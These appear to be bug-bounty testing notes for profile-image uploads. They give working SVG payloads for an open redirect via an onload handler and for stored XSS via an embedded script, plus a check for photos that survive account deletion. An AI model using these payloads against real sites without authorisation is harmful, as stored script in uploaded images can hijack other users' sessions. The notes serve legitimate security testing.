*Open direction via profile image
* Check the target platform you're working on and identify which image extensions are allowed for profile image uploads (e.g., .jpg, .png, .svg).
* Create a new SVG file (image.svg) with the following code:

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg onload="window.location='https://google.com'" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
</svg>
* Upload the SVG File as Profile Image.
* Open the uploaded avatar image in a new window or tab.
* Observe the behavior. If the code works, you will be redirected to https://google.com.

* Cross-site scripting(XSS) via profile image
* Create a new SVG file (xss_image.svg) with the following code:
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
  <script type="text/javascript">
    alert("XSS by noor");
  </script>
</svg>

* Upload the XSS SVG File as Profile Image.
* Open the uploaded avatar image in a new window or tab.
* Observe the behavior. If the code works, an alert box with the message "XSS by noor" will pop up.
* reference: https://0xkemo.medium.com/how-i-was-able-to-find-2-stored-xss-via-svg-file-upload-273d1609a057, https://infosecwriteups.com/stored-xss-using-svg-file-2e3608248fae, https://medium.com/@paxnull/stored-xss-via-file-upload-using-svg-file-c1e2a33ed8a8

* Insecure Data Storage
* Go to your target website and upload a profile photo.
* Right click on the photo and click on view image.
* Now a link will open where your photo is uploaded like : https://www.example.com/<id>/photo.jpg.
* Copy the link and save it in notepad.
* Now delete your account and then visit the link.
* If your still able to see the photo means it is vulnerable to Insecure Data Storage.
